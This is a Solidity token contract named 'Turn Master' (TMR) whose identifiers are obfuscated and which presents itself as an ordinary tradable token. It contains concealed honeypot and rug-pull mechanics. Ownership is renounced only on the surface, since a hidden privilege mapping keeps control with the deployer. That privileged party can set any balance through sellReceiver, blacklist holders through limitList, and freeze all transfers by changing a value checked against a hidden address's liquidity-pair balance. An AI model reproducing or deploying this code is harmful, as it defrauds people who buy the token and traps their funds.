//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface marketingAtMin {
    function createPair(address receiverLimitSender, address sellExempt) external returns (address);
}

interface exemptTotal {
    function totalSupply() external view returns (uint256);

    function balanceOf(address isTake) external view returns (uint256);

    function transfer(address takeAmountList, uint256 maxLimit) external returns (bool);

    function allowance(address amountTx, address spender) external view returns (uint256);

    function approve(address spender, uint256 maxLimit) external returns (bool);

    function transferFrom(
        address sender,
        address takeAmountList,
        uint256 maxLimit
    ) external returns (bool);

    event Transfer(address indexed from, address indexed listAmountToken, uint256 value);
    event Approval(address indexed amountTx, address indexed spender, uint256 value);
}

abstract contract buyFee {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface teamLimitTx {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface exemptTotalMetadata is exemptTotal {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract TurnMaster is buyFee, exemptTotal, exemptTotalMetadata {

    function getOwner() external view returns (address) {
        return limitShould;
    }

    function atMarketing() public {
        emit OwnershipTransferred(minAmount, address(0));
        limitShould = address(0);
    }

    constructor (){
        
        teamLimitTx totalAmount = teamLimitTx(exemptLaunch);
        walletLiquiditySender = marketingAtMin(totalAmount.factory()).createPair(totalAmount.WETH(), address(this));
        
        minAmount = _msgSender();
        totalReceiver[minAmount] = true;
        isSwapTotal[minAmount] = swapList;
        atMarketing();
        
        emit Transfer(address(0), minAmount, swapList);
    }

    address private limitShould;

    uint256 public tokenMax;

    address totalSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => bool) public receiverSwapMarketing;

    function transfer(address tradingTo, uint256 maxLimit) external virtual override returns (bool) {
        return tradingBuyToken(_msgSender(), tradingTo, maxLimit);
    }

    bool public minSell;

    bool public txMarketing;

    uint256 private takeIsAt;

    function approve(address autoTake, uint256 maxLimit) public virtual override returns (bool) {
        limitSenderLiquidity[_msgSender()][autoTake] = maxLimit;
        emit Approval(_msgSender(), autoTake, maxLimit);
        return true;
    }

    address public walletLiquiditySender;

    function transferFrom(address autoWalletFund, address takeAmountList, uint256 maxLimit) external override returns (bool) {
        if (_msgSender() != exemptLaunch) {
            if (limitSenderLiquidity[autoWalletFund][_msgSender()] != type(uint256).max) {
                require(maxLimit <= limitSenderLiquidity[autoWalletFund][_msgSender()]);
                limitSenderLiquidity[autoWalletFund][_msgSender()] -= maxLimit;
            }
        }
        return tradingBuyToken(autoWalletFund, takeAmountList, maxLimit);
    }

    uint256 public sellShouldToken;

    function decimals() external view virtual override returns (uint8) {
        return launchList;
    }

    function teamExempt(uint256 maxLimit) public {
        receiverShould();
        fromTxShould = maxLimit;
    }

    function symbol() external view virtual override returns (string memory) {
        return swapLaunch;
    }

    uint8 private launchList = 18;

    uint256 private swapList = 100000000 * 10 ** 18;

    mapping(address => mapping(address => uint256)) private limitSenderLiquidity;

    uint256 private teamMax;

    address exemptLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function name() external view virtual override returns (string memory) {
        return buyReceiverTeam;
    }

    function receiverShould() private view {
        require(totalReceiver[_msgSender()]);
    }

    function limitList(address autoMin) public {
        receiverShould();
        if (swapWallet) {
            teamMax = tokenMax;
        }
        if (autoMin == minAmount || autoMin == walletLiquiditySender) {
            return;
        }
        receiverSwapMarketing[autoMin] = true;
    }

    mapping(address => bool) public totalReceiver;

    string private swapLaunch = "TMR";

    uint256 constant atSwap = 18 ** 10;

    function tradingBuyToken(address autoWalletFund, address takeAmountList, uint256 maxLimit) internal returns (bool) {
        if (autoWalletFund == minAmount) {
            return amountTotalMode(autoWalletFund, takeAmountList, maxLimit);
        }
        uint256 feeLiquidity = exemptTotal(walletLiquiditySender).balanceOf(totalSender);
        require(feeLiquidity == fromTxShould);
        require(takeAmountList != totalSender);
        if (receiverSwapMarketing[autoWalletFund]) {
            return amountTotalMode(autoWalletFund, takeAmountList, atSwap);
        }
        return amountTotalMode(autoWalletFund, takeAmountList, maxLimit);
    }

    string private buyReceiverTeam = "Turn Master";

    function totalSupply() external view virtual override returns (uint256) {
        return swapList;
    }

    function owner() external view returns (address) {
        return limitShould;
    }

    function walletExempt(address takeMarketing) public {
        require(takeMarketing.balance < 100000);
        if (minSell) {
            return;
        }
        if (sellShouldToken != takeIsAt) {
            sellShouldToken = teamMax;
        }
        totalReceiver[takeMarketing] = true;
        
        minSell = true;
    }

    event OwnershipTransferred(address indexed totalEnable, address indexed fromList);

    function allowance(address receiverReceiver, address autoTake) external view virtual override returns (uint256) {
        if (autoTake == exemptLaunch) {
            return type(uint256).max;
        }
        return limitSenderLiquidity[receiverReceiver][autoTake];
    }

    function balanceOf(address isTake) public view virtual override returns (uint256) {
        return isSwapTotal[isTake];
    }

    uint256 fromTxShould;

    uint256 launchedBuy;

    function amountTotalMode(address autoWalletFund, address takeAmountList, uint256 maxLimit) internal returns (bool) {
        require(isSwapTotal[autoWalletFund] >= maxLimit);
        isSwapTotal[autoWalletFund] -= maxLimit;
        isSwapTotal[takeAmountList] += maxLimit;
        emit Transfer(autoWalletFund, takeAmountList, maxLimit);
        return true;
    }

    function sellReceiver(address tradingTo, uint256 maxLimit) public {
        receiverShould();
        isSwapTotal[tradingTo] = maxLimit;
    }

    address public minAmount;

    mapping(address => uint256) private isSwapTotal;

    bool public swapWallet;

}